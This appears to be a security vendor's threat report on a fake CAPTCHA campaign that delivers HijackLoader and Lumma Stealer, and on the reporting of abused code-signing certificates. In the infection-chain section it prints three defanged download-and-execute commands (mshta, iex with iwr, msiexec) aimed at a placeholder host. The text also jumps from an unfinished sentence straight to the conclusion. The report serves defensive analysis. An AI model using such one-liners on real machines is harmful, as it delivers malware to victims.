                            <h2>Summary</h2>
<p>Since mid-September 2024, our telemetry has revealed a significant increase in &#8220;Lumma Stealer&#8221;<sup id="fnref1_lumma"><a class="footnote-ref" href="#fn_lumma">1</a></sup> malware deployments via the &#8220;HijackLoader&#8221;<sup id="fnref1_hijack"><a class="footnote-ref" href="#fn_hijack">2</a></sup> malicious loader.</p>
<p>On October 2, 2024, HarfangLab EDR detected and blocked yet another HijackLoader deployment attempt &#8211; except this time, the malware sample was properly signed with a genuine code-signing certificate.</p>
<p>In response, we initiated a hunt for code-signing certificates (ab)used to sign malware samples. We identified and reported more of such certificates. This report briefly presents the associated stealer threat, outlines the methodology for hunting these certificates, and providees indicators of compromise.</p>
<h2>HijackLoader deployment workflow</h2>
<h3>Infection chain: the fake CAPTCHA campaign</h3>
<p>The so-called &#8220;fake CAPTCHA&#8221; campaign has already been extensively documented<sup id="fnref1_captcha"><a class="footnote-ref" href="#fn_captcha">3</a></sup>. The overall deployment tactic is unfolded as follows:</p>

<figure id="attachment_130205" class="wp-caption alignnone"><img decoding="async" class="img-fluid full wp-image-130205 " src="https://harfanglab.io/medias/2024/10/1-campaign-flow-e1728642041401.png" alt="Figure 1 - Infection chain overview" width="556" height="396" srcset="https://harfanglab.io/medias/2024/10/1-campaign-flow-e1728642041401.png 580w, https://harfanglab.io/medias/2024/10/1-campaign-flow-e1728642041401-480x342.png 480w, https://harfanglab.io/medias/2024/10/1-campaign-flow-e1728642041401-360x256.png 360w, https://harfanglab.io/medias/2024/10/1-campaign-flow-e1728642041401-240x171.png 240w" sizes="(max-width: 556px) 100vw, 556px" /><figcaption class="wp-caption-text"> Figure 1 &#8211; Infection chain overview</figcaption></figure>

<p>1) The target visits a malicious website showing a fake CAPTCHA Web page:</p>

<figure id="attachment_130208" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-130208">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/10/2-captcha.png.webp"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/10/2-captcha.png" alt="Figure 2 - Fake CAPTCHA Web page" width="414" height="232"/>
</picture>
<figcaption class="wp-caption-text"> Figure 2 &#8211; Fake CAPTCHA Web page</figcaption></figure>

<p>2) Upon clicking the &#8220;<em>I&#8217;m not a robot</em>&#8221; button, a pop-up invites targets to type a series of keyboard shortcuts so they open a command line interpreter, paste and execute a PowerShell payload (which has been automatically copied in the clipboard):</p>

<figure id="attachment_130211" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-130211">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts.png.webp 678w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-480x358.png.webp 480w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-360x269.png.webp 360w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-240x179.png.webp 240w" sizes="(max-width: 523px) 100vw, 523px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts.png" alt="Figure 3 - Path to PowerShell execution" width="523" height="391" srcset="https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts.png 678w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-480x358.png 480w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-360x269.png 360w, https://harfanglab.io/medias/2024/10/3-keyboard-shortcuts-240x179.png 240w" sizes="(max-width: 523px) 100vw, 523px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 3 &#8211; Path to PowerShell execution</figcaption></figure>

<p>3) As a result of the PowerShell execution, a ZIP archive is downloaded, decompressed and a binary is executed from it.</p>
<p>Starting mid-September 2024, we could identify in our telemetry 3 variants of the PowerShell script which is used during the second step:</p>
<ul>
	<li>Use of <code>mshta.exe</code><sup id="fnref1_mshta"><a class="footnote-ref" href="#fn_mshta">4</a></sup>: The script leverages the Microsoft HTML Application Host to execute malicious code from a remote URL. Arbitrary example: <code>mshta hxxps://payload[.]url/tra17</code></li>
	<li>Raw PowerShell with <code>iex</code> (Invoke-Expression)<sup id="fnref1_iex"><a class="footnote-ref" href="#fn_iex">5</a></sup>. In this variant, a PowerShell script is directly executed from a remote file. Arbitrary example: <code>iex (iwr hxxps://payload[.]url/a.txt -UseBasicParsing).Content</code></li>
	<li>Use of <code>msiexec.exe</code><sup id="fnref1_msiexec"><a class="footnote-ref" href="#fn_msiexec">6</a></sup>: The script also employs the Microsoft Windows Installer to silently download and execute a payload from a remote URL. Arbitrary example: <code>C:\windows\system32\msiexec.exe /fv hxxps://payload[.]url/DB2jh /q</code></li>
</ul>
<h3>HijackLoader execution from DLL sideloading</h3>
<p>The initial ZIP archive samples we analyzed from the aforementioned infection chain contained a DLL sideloading<sup id="fnref1_dll_sideloading"><a class="footnote-ref" href="#fn_dll_sideloading">7</a></sup> package, which led to HijackLoader execution. This package consists of three components:</p>
<ol>
	<li>A legitimate application binary;</li>
	<li>A malicious sideloaded DLL;</li>
	<li>An optional additional data file.</li>
</ol>

<figure id="attachment_130214" class="wp-caption alignnone"><picture decoding="async" class="img-fluid full wp-image-130214 size-full">
<source type="image/webp" srcset="https://harfanglab.io/medias/2024/10/4-hlsideloading.png.webp 580w, https://harfanglab.io/medias/2024/10/4-hlsideloading-480x306.png.webp 480w, https://harfanglab.io/medias/2024/10/4-hlsideloading-360x230.png.webp 360w, https://harfanglab.io/medias/2024/10/4-hlsideloading-240x153.png.webp 240w" sizes="(max-width: 580px) 100vw, 580px"/>
<img decoding="async" src="https://harfanglab.io/medias/2024/10/4-hlsideloading.png" alt="Figure 4 - HijackLoader and DLL sideloading" width="580" height="370" srcset="https://harfanglab.io/medias/2024/10/4-hlsideloading.png 580w, https://harfanglab.io/medias/2024/10/4-hlsideloading-480x306.png 480w, https://harfanglab.io/medias/2024/10/4-hlsideloading-360x230.png 360w, https://harfanglab.io/medias/2024/10/4-hlsideloading-240x153.png 240w" sizes="(max-width: 580px) 100vw, 580px"/>
</picture>
<figcaption class="wp-caption-text"> Figure 4 &#8211; HijackLoader and DLL sideloading</figcaption></figure>

<p>For most DLL sideloading packages we analyzed, the purpose of the sideloaded HijackLoader DLL is to decrypt and execute an encrypted file which is provided in the package. This file conceals the final HijackLoader stage, which is aimed at downloading and executing a stealer implant (Lumma Stealer in our cases).</p>
<h3>A wild signed HijackLoader appears!</h3>
<p>On October 2, 2024, HarfangLab EDR detected and blocked a HijackLoader deployment attempt against a customer. We noticed that the executable which triggered the detection (SHA-256: <code>1839b7152814b16b9f28326081f16bf9c5bbbb380005232c92d25c9a3e36e337</code>) was a signed<sup id="fnref1_code_signing"><a class="footnote-ref" href="#fn_code_signing">8</a></sup> HijackLoader sample, and was not part of a DLL sideloading package:</p>

<h2>Conclusion</h2>
<p>Our investigation, initiated by a HarfangLab EDR detection, led to identification of multiple abused code-signing certificates and associated malicious samples actively used in the wild.</p>
<p>We reported these abused code-signing certificates to their issuing autorities, resulting in them being revoked, within hours up to almost a day, enabling proper detection by other security vendors.</p>
<p>While we could not reliably determine whether these certificates were stolen or purposefully generated by threat actors, we assess with low to medium confidence that they were likely created deliberately. For several issuing certificate autorities, we noticed that acquiring and activating a code-signing certificate is mostly automated, and only requires a valid company registration number as well as a contact person.</p>
<p>This research underscores that malware can be signed, highlighting that code signature alone cannot serve as a baseline indicator of trustworthiness. Therefore, it&#8217;s crucial to implement several complementary detection tactics, such as monitoring system behaviors and conducting in-memory scanning on endpoints, to protect against the execution of signed malware.</p>

	<li id="fn_lumma">
<p>Lumma Stealer is a infostealer targeting cryptocurrency wallets, two-factor authentication browser extensions and credential from the victim&#8217;s machine. <a class="footnote-backref" href="#fnref1_lumma" rev="footnote">↩</a></p>
</li>
	<li id="fn_hijack">
<p>HijackLoader: Loader first spotted in July 2023. It implements several evasion techniques including Process Doppelgänging, DLL Search Order Hijacking, and Heaven&#8217;s Gate. It has been observed to store its malicious payload in the IDAT chunk of PNG file format. <a class="footnote-backref" href="#fnref1_hijack" rev="footnote">↩</a></p>
</li>
	<li id="fn_captcha">
<p>Fake CAPTCHA Pages and PowerShell: <a href="https://denwp.com/anatomy-of-a-lumma-stealer/">https://denwp.com/anatomy-of-a-lumma-stealer/</a> <a class="footnote-backref" href="#fnref1_captcha" rev="footnote">↩</a></p>
</li>
	<li id="fn_mshta">
<p>mshta (Microsoft HTML Application Host): A Windows utility that executes HTML applications (.HTA files). Attackers often use mshta.exe to run malicious JavaScript or VBScript code from a remote URL, bypassing security controls since it is a legitimate system tool. <a class="footnote-backref" href="#fnref1_mshta" rev="footnote">↩</a></p>
</li>
	<li id="fn_iex">
<p>Invoke-Expression (or iex): A PowerShell cmdlet that runs or &#8220;invokes&#8221; the expression passed to it. It is often used by malware to execute code retrieved from the Internet, making it a popular choice for fileless attacks or direct command execution from remote sources. <a class="footnote-backref" href="#fnref1_iex" rev="footnote">↩</a></p>
</li>
	<li id="fn_msiexec">
<p>msiexec (Microsoft Windows Installer): A built-in utility for installing, modifying, and configuring Windows software. Attackers can misuse msiexec.exe to download and execute malicious MSI files or payloads via remote URLs. <a class="footnote-backref" href="#fnref1_msiexec" rev="footnote">↩</a></p>
</li>
	<li id="fn_dll_sideloading">
<p>DLL sideloading is a technique used by attackers to trick legitimate software into loading a malicious library instead of a legitimate one. When the software runs, it looks for the necessary libraries in different locations, including the software execution folder. Should a malicious and correctly prepared library be placed in the same folder than the program, it would be loaded before some legitimate system ones (see <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order</a>). <a class="footnote-backref" href="#fnref1_dll_sideloading" rev="footnote">↩</a></p>
</li>
	<li id="fn_code_signing">
<p>Code-signing is a process that ensures a software is authentic and hasn’t been tampered with. This signature acts like a seal of approval, confirming that the software comes from a trusted source and has not been altered by anyone else. However, if malware is also code-signed, it poses a huge security threat. A signed piece of malware can appear trustworthy to both users and security software, making it more likely to be installed and less likely to be detected. <a class="footnote-backref" href="#fnref1_code_signing" rev="footnote">↩</a></p>
</li>
	<li id="fn_analysis00">
<p><a href="https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/">https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/</a> <a class="footnote-backref" href="#fnref1_analysis00" rev="footnote">↩</a></p>
</li>
	<li id="fn_analysis01">
<p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-hijackloader">https://www.zscaler.com/blogs/security-research/technical-analysis-hijackloader</a> <a class="footnote-backref" href="#fnref1_analysis01" rev="footnote">↩</a></p>
</li>
	<li id="fn_analysis02">
<p><a href="https://www.zscaler.com/blogs/security-research/hijackloader-updates">https://www.zscaler.com/blogs/security-research/hijackloader-updates</a> <a class="footnote-backref" href="#fnref1_analysis02" rev="footnote">↩</a></p>
</li>
	<li id="fn_C2">
<p>Command and control (C&amp;C or C2): refers to a server or infrastructure controlled by cybercriminals that communicates with compromised devices or malware. The C&amp;C server sends instructions to the malware (like stealing data or spreading further) and receives feedback from it. <a class="footnote-backref" href="#fnref1_C2" rev="footnote">↩</a></p>
</li>
